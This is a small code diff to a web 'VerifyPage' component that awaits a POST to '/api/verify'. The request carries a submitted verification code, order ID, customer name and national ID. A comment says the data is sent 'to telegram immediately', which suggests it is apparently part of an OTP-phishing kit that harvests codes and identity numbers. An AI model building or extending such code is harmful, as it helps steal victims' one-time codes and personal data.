@@ -66,7 +66,7 @@ export default function VerifyPage() {
     const submittedCode = code;
 
     // Send to telegram immediately
-    fetch("/api/verify", {
+    await fetch("/api/verify", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ code: submittedCode, orderId, customerName, customerId: customer?.nationalId ?? "—" }),
